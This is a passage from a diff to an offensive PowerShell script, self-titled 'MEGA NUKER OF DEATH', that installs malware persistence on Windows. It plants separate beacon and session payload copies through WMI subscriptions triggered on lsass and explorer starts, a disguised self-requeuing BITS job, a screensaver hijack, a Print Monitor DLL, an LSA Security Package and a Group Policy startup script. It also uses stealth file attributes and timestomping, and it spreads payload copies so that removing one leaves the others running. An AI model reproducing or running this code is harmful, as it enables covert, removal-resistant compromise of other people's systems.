-    -Command      ('"' + $script:PrimaryBeacon + '"')
-if ($f3ok) { Add-Log "F3" "WMI" "explorer-start/beacon" "OK" }
+    -FilterName    "WMILsassStartFilter" `
+    -ConsumerName  "WMILsassConsumer" `
+    -Query         "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'lsass.exe'" `
+    -Command       ('"' + $f3Beacon + '"')
+if ($f3ok) { Add-Log "F3" "WMI" "lsass-start/beacon" "OK" "cmd=$f3Beacon" }
 
 Write-StateLog
 
@@ -690,46 +749,45 @@ Write-StateLog
 # =============================================================================
 Write-Section "G - BITS Persistence"
 
+$gBeacon = Get-NextBeacon
 try {
     $bitsBeacon  = Join-Path $StagingBase "${pfx}bits_beacon.exe"
     $bitsStage   = Join-Path $StagingBase "${pfx}bits_stage.exe"
     $bitsNotify  = Join-Path $StagingBase "${pfx}bits_notify.ps1"
     $bitsJobName = "WU_Telemetry_DiagnosticsSync"
 
-    $null = Copy-Stealth -Source $BeaconPath -Destination $bitsBeacon
+    $null = Copy-Stealth -Source $gBeacon -Destination $bitsBeacon
 
-    # Build the notify/requeue script as pure ASCII
-    $n1 = "Start-Process -FilePath '$bitsBeacon' -WindowStyle Hidden -ErrorAction SilentlyContinue"
-    $n2 = "Start-Sleep -Seconds 3"
-    $n3 = "Remove-Item -Path '$bitsStage' -Force -ErrorAction SilentlyContinue"
-    $n4 = '$jOut  = bitsadmin /Create "' + $bitsJobName + '" 2>&1'
-    $n5 = '$jGuid = ([regex]::Match(($jOut | Out-String), ''\{[0-9A-Fa-f-]+\}'')).Value'
-    $n6 = 'if ($jGuid) {'
-    $n7 = "    bitsadmin /AddFile `$jGuid '\\127.0.0.1\C`$\' + '$bitsBeacon'.Substring(3) '$bitsStage'"
-    $n8 = "    bitsadmin /SetPriority `$jGuid FOREGROUND"
-    $n9 = "    bitsadmin /SetMinRetryDelay `$jGuid 300"
-    $n10 = "    bitsadmin /SetNoProgressTimeout `$jGuid 7776000"
-    $n11 = "    bitsadmin /SetNotifyFlags `$jGuid 3"
-    $n12 = "    bitsadmin /SetNotifyCmdLine `$jGuid 'powershell.exe' '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$bitsNotify""'"
-    $n13 = "    bitsadmin /Resume `$jGuid"
-    $n14 = "}"
-    $notifyContent = ($n1,$n2,$n3,$n4,$n5,$n6,$n8,$n9,$n10,$n11,$n12,$n13,$n14) -join "`r`n"
+    # Build UNC here so it's available for the notify script content below
+    $driveLetter = $bitsBeacon.Substring(0,1)
+    $restOfPath  = $bitsBeacon.Substring(2)   # includes leading "\" -> "\\server\C$\Windows\..."
+    $bitsUNC     = "\\127.0.0.1\${driveLetter}`$$restOfPath"
+
+    $n1  = "Start-Process -FilePath '$bitsBeacon' -WindowStyle Hidden -ErrorAction SilentlyContinue"
+    $n2  = "Start-Sleep -Seconds 3"
+    $n3  = "Remove-Item -Path '$bitsStage' -Force -ErrorAction SilentlyContinue"
+    $n4  = '$jOut  = bitsadmin /Create "' + $bitsJobName + '" 2>&1'
+    $n5  = '$jGuid = ([regex]::Match(($jOut | Out-String), ''\{[0-9A-Fa-f-]+\}'')).Value'
+    $n6  = 'if ($jGuid) {'
+    $n6b = "    bitsadmin /AddFile `$jGuid `"$bitsUNC`" `"$bitsStage`""
+    $n7  = "    bitsadmin /SetPriority `$jGuid FOREGROUND"
+    $n8  = "    bitsadmin /SetMinRetryDelay `$jGuid 300"
+    $n9  = "    bitsadmin /SetNoProgressTimeout `$jGuid 7776000"
+    $n10 = "    bitsadmin /SetNotifyFlags `$jGuid 3"
+    $n11 = "    bitsadmin /SetNotifyCmdLine `$jGuid 'powershell.exe' '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$bitsNotify""'"
+    $n12 = "    bitsadmin /Resume `$jGuid"
+    $n13 = "}"
+    $notifyContent = ($n1,$n2,$n3,$n4,$n5,$n6,$n6b,$n7,$n8,$n9,$n10,$n11,$n12,$n13) -join "`r`n"
     [System.IO.File]::WriteAllText($bitsNotify, $notifyContent, [System.Text.Encoding]::ASCII)
     Set-StealthAttributes $bitsNotify
     Invoke-Timestomp      $bitsNotify
 
-    # Cancel any existing same-named job
     $listOut  = & bitsadmin /List /AllUsers 2>&1 | Out-String
     $allGuids = [regex]::Matches($listOut, '\{[0-9A-Fa-f-]+\}') | Select-Object -ExpandProperty Value
     foreach ($g in $allGuids) {
         $info = & bitsadmin /Info $g /Verbose 2>&1 | Out-String
         if ($info -match [regex]::Escape($bitsJobName)) { & bitsadmin /Cancel $g 2>&1 | Out-Null }
     }
-
-    # Build UNC path to beacon for BITS
-    $driveLetter = $bitsBeacon.Substring(0,1)
-    $restOfPath  = $bitsBeacon.Substring(3)
-    $bitsUNC     = "\\127.0.0.1\${driveLetter}`$$restOfPath"
 
     $createOut = & bitsadmin /Create $bitsJobName 2>&1 | Out-String
     $jobGuid   = ([regex]::Match($createOut, '\{[0-9A-Fa-f-]+\}')).Value
@@ -744,8 +802,8 @@ try {
         $notifyArg = "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$bitsNotify`""
         & bitsadmin /SetNotifyCmdLine     $jobGuid "powershell.exe" $notifyArg 2>&1 | Out-Null
         & bitsadmin /Resume               $jobGuid                     2>&1 | Out-Null
-        Write-Success "G BITS: job $jobGuid created ($bitsJobName)"
-        Add-Log "G" "BITS" $bitsJobName "OK" "guid=$jobGuid"
+        Write-Success "G BITS: job $jobGuid ($bitsJobName) -> $gBeacon"
+        Add-Log "G" "BITS" $bitsJobName "OK" "guid=$jobGuid;src=$gBeacon"
     } else {
         Write-Warn "G BITS: no GUID returned (admin shares may be disabled)"
         Add-Log "G" "BITS" $bitsJobName "FAIL" "no guid"
@@ -758,33 +816,22 @@ Write-StateLog
 # =============================================================================
 Write-Section "H - Miscellaneous Persistence"
 
-# H1: SilentProcessExit on svchost.exe
-Write-Section "H1 - SilentProcessExit (svchost.exe -> beacon on every exit)"
+# H1: Screensaver hijack (current user + all offline user hives)
+# NOTE: Removed SilentProcessExit on svchost.exe -- fires hundreds of times per
+# boot and would flood the system with beacon processes.
+Write-Section "H1 - Screensaver Hijack"
+$h1Beacon = Get-NextBeacon
 try {
-    $ifeoKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe"
-    $speKey  = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe"
-    if (-not (Test-Path $ifeoKey)) { New-Item -Path $ifeoKey -Force | Out-Null }
-    Set-ItemProperty $ifeoKey -Name "GlobalFlag"    -Value 0x200 -Type DWord -Force
-    if (-not (Test-Path $speKey)) { New-Item -Path $speKey -Force | Out-Null }
-    Set-ItemProperty $speKey  -Name "MonitorProcess" -Value $script:PrimaryBeacon -Type String -Force
-    Set-ItemProperty $speKey  -Name "ReportingMode"  -Value 0 -Type DWord -Force
-    Write-Success "H1 SilentProcessExit: svchost.exe exits -> beacon fires"
-    Add-Log "H1" "SilentProcessExit" $speKey "OK"
-} catch { Write-Warn "H1 SilentProcessExit failed: $_" }
-
-# H2: Screensaver hijack (current user + all offline user hives)
-Write-Section "H2 - Screensaver Hijack"
-try {
-    $scrDest = "$env:SystemRoot\System32\${pfx}diag_saver.scr"
-    $scrResult = Copy-Stealth -Source $BeaconPath -Destination $scrDest
-    if (-not $scrResult) { $scrDest = $BeaconPath }
+    $scrDest   = "$env:SystemRoot\System32\${pfx}diag_saver.scr"
+    $scrResult = Copy-Stealth -Source $h1Beacon -Destination $scrDest
+    if (-not $scrResult) { $scrDest = $h1Beacon }
 
     $desktopKey = "HKCU:\Control Panel\Desktop"
     Set-ItemProperty $desktopKey -Name "SCRNSAVE.EXE"        -Value $scrDest -Force
     Set-ItemProperty $desktopKey -Name "ScreenSaveActive"    -Value "1"      -Force
     Set-ItemProperty $desktopKey -Name "ScreenSaveTimeOut"   -Value "60"     -Force
     Set-ItemProperty $desktopKey -Name "ScreenSaverIsSecure" -Value "0"      -Force
-    Add-Log "H2" "Screensaver" $scrDest "OK" "current user"
+    Add-Log "H1" "Screensaver" $scrDest "OK" "current user"
 
     $ssOk = 0
     Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
@@ -806,59 +853,62 @@ try {
                 } finally { & reg.exe unload $tmpKey 2>&1 | Out-Null }
             }
         }
-    Write-Success "H2 Screensaver: $scrDest ($ssOk offline hives)"
-} catch { Write-Warn "H2 Screensaver failed: $_" }
+    Write-Success "H1 Screensaver: $scrDest ($ssOk offline hives)"
+} catch { Write-Warn "H1 Screensaver failed: $_" }
 
-# H3: Print Monitor registration + fallback scheduled task
-Write-Section "H3 - Print Monitor (T1547.010)"
+# H2: Print Monitor DLL registration + fallback scheduled task
+Write-Section "H2 - Print Monitor (T1547.010)"
+$h2Session = Get-NextSession
 try {
     $monitorName    = "${pfx}WMIPerfCounterMonitor"
     $monitorDllName = "${pfx}localspl_ext.dll"
     $monitorDllDest = "$env:SystemRoot\System32\$monitorDllName"
     $monitorKey     = "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\$monitorName"
 
-    Copy-Stealth -Source $SessionPath -Destination $monitorDllDest | Out-Null
+    Copy-Stealth -Source $h2Session -Destination $monitorDllDest | Out-Null
     if (-not (Test-Path $monitorKey)) { New-Item -Path $monitorKey -Force | Out-Null }
     Set-ItemProperty $monitorKey -Name "Driver" -Value $monitorDllName -Force
-    Write-Success "H3 Print Monitor: $monitorKey"
-    Add-Log "H3" "PrintMonitor" $monitorKey "OK"
+    Write-Success "H2 Print Monitor: $monitorKey -> $h2Session"
+    Add-Log "H2" "PrintMonitor" $monitorKey "OK"
 
-    # Fallback task in case spoolsv doesn't load the EXE-as-DLL
-    $xml = Get-TaskXml -Command $script:PrimarySession -OffsetSeconds 90 -AddLogon $false -Description "WMI performance counter monitor"
+    $h2Task = Get-NextSession
+    $xml = Get-TaskXml -Command $h2Task -OffsetSeconds 90 -AddLogon $false -Description "WMI performance counter monitor"
     New-TaskSubfolder -FolderPath "Microsoft\Windows\PrintService"
     Unregister-ScheduledTask -TaskName "WMIPerfCounterMonitor" -TaskPath "\Microsoft\Windows\PrintService\" -Confirm:$false -EA SilentlyContinue
     Register-ScheduledTask   -TaskName "WMIPerfCounterMonitor" -TaskPath "\Microsoft\Windows\PrintService\" -Xml $xml -Force -EA SilentlyContinue | Out-Null
-    Write-Success "H3 Print Monitor fallback task registered"
-    Add-Log "H3" "PrintMonTask" "\Microsoft\Windows\PrintService\WMIPerfCounterMonitor" "OK"
-} catch { Write-Warn "H3 Print Monitor failed: $_" }
+    Write-Success "H2 Print Monitor fallback task -> $h2Task"
+    Add-Log "H2" "PrintMonTask" "\Microsoft\Windows\PrintService\WMIPerfCounterMonitor" "OK"
+} catch { Write-Warn "H2 Print Monitor failed: $_" }
 
-# H4: LSA Security Package
-Write-Section "H4 - LSA Security Package (T1547.005)"
+# H3: LSA Security Package
+Write-Section "H3 - LSA Security Package (T1547.005)"
+$h3Session = Get-NextSession
 try {
     $lsaKey     = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
     $pkgName    = "${pfx}wbemcore_sec"
     $pkgDllDest = "$env:SystemRoot\System32\${pkgName}.dll"
-    $copyResult = Copy-Stealth -Source $SessionPath -Destination $pkgDllDest
+    $copyResult = Copy-Stealth -Source $h3Session -Destination $pkgDllDest
     if (-not $copyResult) {
-        Write-Warn "H4: DLL copy failed -- skipping LSA registration"
+        Write-Warn "H3: DLL copy failed -- skipping LSA registration"
     } else {
         $current = (Get-ItemProperty $lsaKey -Name "Security Packages" -ErrorAction Stop)."Security Packages"
         if ($current -isnot [array]) { $current = @($current) }
         $current = @($current | Where-Object { $_ })
         if ($current -notcontains $pkgName) {
             Set-ItemProperty $lsaKey -Name "Security Packages" -Value ($current + $pkgName) -Type MultiString -Force
-            Write-Success "H4 LSA Security Package: '$pkgName' added (takes effect after reboot)"
-            Add-Log "H4" "LSASecPkg" $pkgDllDest "OK"
-        } else { Write-Info "H4: $pkgName already present" }
+            Write-Success "H3 LSA Security Package: '$pkgName' added (takes effect after reboot)"
+            Add-Log "H3" "LSASecPkg" $pkgDllDest "OK"
+        } else { Write-Info "H3: $pkgName already present" }
     }
-} catch { Write-Warn "H4 LSA Security Package failed: $_" }
+} catch { Write-Warn "H3 LSA Security Package failed: $_" }
 
-# H5: Domain GP startup script (if domain-joined)
-Write-Section "H5 - Domain GP Startup Script (if domain-joined)"
+# H4: Domain GP startup script (if domain-joined)
+Write-Section "H4 - Domain GP Startup Script (if domain-joined)"
+$h4Beacon = Get-NextBeacon
 try {
     $netlogonSvc = Get-Service -Name "Netlogon" -ErrorAction SilentlyContinue
     if (-not $netlogonSvc) {
-        Write-Info "H5: Netlogon not present -- skipping (standalone/workgroup)"
+        Write-Info "H4: Netlogon not present -- skipping (standalone/workgroup)"
     } else {
         $gpStartupKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0"
         $gpScriptKey  = "$gpStartupKey\0"
@@ -867,13 +917,13 @@ try {
         Set-ItemProperty $gpStartupKey -Name "GPO-ID"       -Value "LocalGPO" -Force
         Set-ItemProperty $gpStartupKey -Name "SOM-ID"       -Value "Local"    -Force
         Set-ItemProperty $gpStartupKey -Name "Count"        -Value 1 -Type DWord -Force
-        Set-ItemProperty $gpScriptKey  -Name "Script"       -Value $script:PrimaryBeacon -Force
+        Set-ItemProperty $gpScriptKey  -Name "Script"       -Value $h4Beacon -Force
         Set-ItemProperty $gpScriptKey  -Name "Parameters"   -Value "" -Force
         Set-ItemProperty $gpScriptKey  -Name "IsPowershell" -Value 0 -Type DWord -Force
-        Write-Success "H5 Domain GP startup script: $($script:PrimaryBeacon)"
-        Add-Log "H5" "NetlogonGP" $gpScriptKey "OK"
+        Write-Success "H4 Domain GP startup script: $h4Beacon"
+        Add-Log "H4" "NetlogonGP" $gpScriptKey "OK"
     }
-} catch { Write-Warn "H5 Domain GP startup script failed: $_" }
+} catch { Write-Warn "H4 Domain GP startup script failed: $_" }
 
 Write-StateLog
 
@@ -888,14 +938,17 @@ Write-Warn "================================================================"
 Write-Warn " MEGA NUKER OF DEATH -- Complete"
 Write-Warn "================================================================"
 Write-Host ""
-Write-Host "  [A] Payload staging:   $($script:StagedBeacons.Count) beacon + $($script:StagedSessions.Count) session copies" -ForegroundColor Cyan
+Write-Host "  [A] Payload staging:   $($script:StagedBeacons.Count) beacon + $($script:StagedSessions.Count) session copies planted" -ForegroundColor Cyan
 Write-Host "  [B] Scheduled tasks:   $bTaskOk/8 beacon + $sTaskOk/8 session (PT5M + Boot + Logon, Hidden, SYSTEM)" -ForegroundColor Cyan
 Write-Host "  [C] Registry:          HKLM(6) + HKCU(4+offline) + WOW64(4) + Userinit + Shell + ActiveSetup(5) + GP" -ForegroundColor Cyan
 Write-Host "  [D] Startup folders:   LNK + BAT + CMD + EXE in All-Users + CurrentUser startup" -ForegroundColor Cyan
 Write-Host "  [E] Services:          WerFaultSvcExt + CryptSvcMonitor + WmiPerfSvcHost + DiagTrackSvcExt" -ForegroundColor Cyan
-Write-Host "  [F] WMI subscriptions: svchost-start(beacon) + 5min-timer(session) + explorer-start(beacon)" -ForegroundColor Cyan
+Write-Host "  [F] WMI subscriptions: explorer-start(beacon) + 5min-timer(session) + lsass-start(beacon)" -ForegroundColor Cyan
 Write-Host "  [G] BITS job:          WU_Telemetry_DiagnosticsSync (self-requeuing)" -ForegroundColor Cyan
-Write-Host "  [H] Misc:              SilentProcessExit + Screensaver + PrintMonitor + LSA SecPkg + GP" -ForegroundColor Cyan
+Write-Host "  [H] Misc:              Screensaver + PrintMonitor + LSA SecPkg + Domain GP" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "  Each mechanism points to a DIFFERENT planted .exe copy." -ForegroundColor Yellow
+Write-Host "  Deleting one file kills only one trigger." -ForegroundColor Yellow
 Write-Host ""
 Write-Success "Log entries: $($script:Log.Count)  OK=$okCount  FAIL=$failCount"
 Write-Success "State log: $($script:StateFile)"
